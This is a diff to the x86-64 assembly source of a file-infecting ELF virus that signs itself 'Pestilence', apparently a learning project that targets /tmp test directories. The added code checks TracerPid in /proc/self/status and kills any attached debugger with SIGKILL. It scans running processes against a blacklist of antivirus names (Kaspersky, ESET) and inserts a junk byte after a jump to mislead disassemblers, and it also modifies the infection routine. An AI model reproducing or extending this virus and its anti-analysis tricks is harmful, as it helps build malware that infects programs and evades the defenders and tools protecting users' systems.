@@ -21,6 +21,7 @@ _start:
     add     al, SYS_OPEN
     syscall
     mov     [rsp], eax
+    call    anti_debug_av
     lea     rdi, [rel dir1]
     call    readdir
     lea     rdi, [rel dir2]
@@ -97,8 +98,287 @@ end_readdir:
     mov     edi, [rsp]
     xor     eax, eax
     add     eax, SYS_CLOSE
+    mov     rdi, [rsp + 0x8]
+    mov     rsi, 0x1000
+    mov     eax, SYS_MUNMAP
+    syscall
     syscall
     leave
+    ret
+
+strcpy:
+    lodsb
+    stosb
+    cmp     BYTE [rsi], 0
+    jnz     strcpy
+    ret
+
+isnum:
+    xor     rax, rax
+    cmp     dil, '0'
+    jl      is_num_failure
+    cmp     dil, '9'
+    jle     is_num_sucess
+is_num_failure:
+    inc     eax
+is_num_sucess:
+    ret
+
+is_proc_dir:
+    xor     eax, eax
+    mov     rsi, rdi
+loop_is_proc_dir:
+    cmp     BYTE [rsi], 0
+    je      end_is_proc_dir
+    mov     dil, BYTE [rsi]
+    call    isnum
+    inc     rsi
+    test    al, al
+    jnz     loop_is_proc_dir
+    inc     eax
+end_is_proc_dir:
+    ret
+
+; [rsp]         fd
+; [rsp + 0x4]   buf_len
+; [rsp + 0x8]   buffer
+; [rsp + 0x10]  index
+anti_debug_av:
+    push    rbp
+    mov     rbp, rsp
+    sub     rsp, 0x20
+
+    lea     rdi, [rel self_str]
+    xor     rsi, rsi
+    inc     rsi
+    call    check_process
+    
+    lea     rdi, [rel proc_dir]
+    mov     rsi, O_DIRECTORY | O_RDONLY
+    xor     eax, eax
+    add     eax, SYS_OPEN
+    syscall
+    mov     [rsp], eax
+
+    xor     rdi, rdi
+    mov     rsi, 0x1000
+    add     rdx, PROT_READ | PROT_WRITE
+    mov     r10, MAP_ANONYMOUS | MAP_PRIVATE
+    xor     r8, r8
+    dec     r8
+    xor     r9, r9
+    xor     eax, eax
+    add     al, SYS_MMAP
+    syscall
+    test    al, al
+    jnz     end_readdir
+    mov     [rsp + 0x8], rax
+
+loop_proc:
+    mov     edi, [rsp]
+    mov     rsi, [rsp + 0x8]
+    mov     rdx, DIRENT_MAX_SIZE
+    xor     eax, eax
+    add     al, SYS_GETDENTS64
+    syscall
+    cmp     eax, 0
+    jle     end_readdir
+    mov     [rsp + 0x4], eax
+    xor     r8, r8
+loop_proc_dirent:
+    mov     [rsp + 0x10], r8w
+    mov     r9, [rsp + 0x8]
+    cmp     BYTE [r9 + r8 + d_type], DT_DIR
+    jne     next_proc_dirent
+    lea     rdi, [r9 + r8 + d_name]
+    call    is_proc_dir
+    test    al, al
+    jz      next_proc_dirent
+    lea     rdi, [r9 + r8 + d_name]
+    xor     rsi, rsi
+    call    check_process
+next_proc_dirent:
+    mov     r9, [rsp + 0x8]
+    movzx   r8, WORD [rsp + 0x10]
+    add     r8w, [r9 + r8 + d_reclen]
+    cmp     r8w, [rsp + 4]
+    jl      loop_proc_dirent
+    jmp     loop_proc
+
+; [rsp]         map
+; [rsp + 0x8]   pid
+; [rsp + 0x10]  self_bool
+check_process:
+    push    rbp
+    mov     rbp, rsp
+    push    rsi
+    push    rdi
+    xor     rdi, rdi
+    mov     rsi, 0x1000
+    xor     rdx, rdx
+    add     rdx, PROT_READ | PROT_WRITE
+    mov     r10, MAP_ANONYMOUS | MAP_PRIVATE
+    xor     r8, r8
+    dec     r8
+    xor     r9, r9
+    xor     eax, eax
+    add     al, SYS_MMAP
+    syscall
+    test    al, al
+    jnz     quit_check_process
+    push    rax
+
+    mov     rdi, rax
+    lea     rsi, [rel proc_dir]
+    call    strcpy
+    mov     rsi, QWORD [rsp + 0x8]
+    call    strcpy
+    lea     rsi, [rel status_file]
+    call    strcpy
+
+    mov     rdi, [rsp]
+    mov     esi, O_RDONLY
+    mov     eax, SYS_OPEN
+    syscall
+    cmp     eax, 0
+    jl      munmap_quit_check_process
+    mov     edi, eax
+    mov     rsi, [rsp]
+    mov     rdx, 0x1000 - 1
+    xor     eax, eax ; SYS_READ
+    syscall
+    cmp     eax, 0
+    jl      munmap_quit_check_process
+    add     rax, [rsp]
+    mov     BYTE [rax], 0
+    mov     eax, SYS_CLOSE
+    syscall
+    mov     rax, [rsp + 0x10]
+    test    rax, rax
+    jnz     test_debugger
+    mov     rdi, [rsp]
+    add     rdi, 6 ; skip Name:\t to access name directly
+    call    test_forbidden_program
+    jmp     munmap_quit_check_process
+test_debugger:
+    mov     rdi, [rsp]
+    lea     rsi, [rel tpid_str]
+    call    strstr
+    mov     rdi, rax
+    call    atoi
+    jmp     fkjmp_debug_test
+    db 0x74
+fkjmp_debug_test:
+    test    eax, eax
+    jz      munmap_quit_check_process
+    mov     edi, eax
+    mov     esi, SIGKILL
+    mov     eax, SYS_KILL
+    syscall
+munmap_quit_check_process:
+    mov     rdi, rax
+    mov     rsi, 0x1000
+    mov     eax, SYS_MUNMAP
+    syscall
+quit_check_process:
+    leave
+    ret
+
+test_forbidden_program:
+    mov     r8, rdi
+    lea     rdi, [rel program_blacklist]
+loop_program_blacklist:
+    mov     rsi, r8
+    repz    cmpsb
+    mov     al, BYTE [rdi - 1]
+    test    al, al
+    jz      quit_virus
+    xor     al, al
+    repnz   scasb
+    mov     al, BYTE [rdi]
+    test    al, al
+    jnz     loop_program_blacklist
+    ret
+
+quit_virus:
+    xor     edi, edi
+    add     edi, 42
+    mov     eax, SYS_EXIT
+    syscall
+
+strncmp:
+    mov     rcx, rdx
+    xor     rax, rax
+    repe    cmpsb
+    mov     al, BYTE [rdi - 1]
+    sub     al, BYTE [rsi - 1]
+    ret
+
+strlen:
+    xor     rax, rax
+    xor     rcx, rcx
+    dec     rcx
+    repnz   scasb
+    not     rcx
+    dec     rcx
+    mov     rax, rcx
+    ret
+
+; [rsp]         needle_len
+; [rsp + 0x8]   haystack_len
+; [rsp + 0x10]  needle
+; [rsp + 0x18]  haystack
+strstr:
+    push    rbp
+    mov     rbp, rsp
+    push    rdi
+    push    rsi
+    call    strlen
+    push    rax
+    mov     rdi, [rbp - 0x10]
+    call    strlen
+    push    rax
+    xor     r8, r8
+loop_strstr:
+    mov     rdi, [rsp + 0x18]
+    add     rdi, r8
+    mov     rsi, [rsp + 0x10]
+    mov     rdx, [rsp]
+    call    strncmp
+    test    rax, rax
+    jnz     check_loop_strstr
+    mov     rax, rdi
+    jmp     quit_strstr
+check_loop_strstr:
+    inc     r8
+    mov     rbx, r8
+    add     rbx, [rsp]
+    cmp     rbx, [rsp + 0x8]
+    jle     loop_strstr
+    xor     rax, rax
+quit_strstr:
+    leave
+    ret
+
+atoi:
+    xor     rbx, rbx
+    mov     rsi, rdi
+    xor     rdi, rdi
+loop_atoi:
+    mov     dil, BYTE [rsi]
+    call    isnum
+    test    al, al
+    jnz     end_atoi
+    sub     dil, '0'
+    mov     ecx, 10
+    mov     eax, ebx
+    mul     ecx
+    mov     ebx, eax
+    add     ebx, edi
+    inc     rsi
+    jmp     loop_atoi
+end_atoi:
+    mov     eax, ebx
     ret
 
 infect:
@@ -108,10 +388,10 @@ infect:
     mov     [rsp + filename], rdi
 
     mov     esi, O_RDWR
-    xor     eax, eax ; SYS_OPEN = 0
+    mov     eax, SYS_OPEN
     syscall
-    test    eax, eax
-    js      quit_infect
+    cmp     eax, 0
+    jl      quit_infect
 
     mov     [rsp + fd], eax
     mov     edi, [rsp + fd]
@@ -515,10 +795,14 @@ payload_mprotect:
     payload_mprotect_len: equ $ - payload_mprotect
     dir1: db "/tmp/test/", 0
     dir2: db "/tmp/test2/", 0
+    proc_dir: db "/proc/", 0
+    status_file: db "/status", 0
+    self_str: db "self", 0
+    tpid_str: db "TracerPid:", 9, 0
+        .len: equ $ - tpid_str
     cwd: db ".", 0
+    program_blacklist: db "test", 0, "kaspersky", 0, "ESET", 0, 0
     signature: db "Pestilence version 1.0 (c)oded by alagroy-", 0
-    data_tmp_text: db "Remapping and infecting .data", 10
-        .len: equ $ - data_tmp_text
     ; TIMES 0x4000 db 0 ; To trigger data infection for testing, will be removed eventuelly
     final_jump: db 0xe9, 0, 0, 0, 0
 
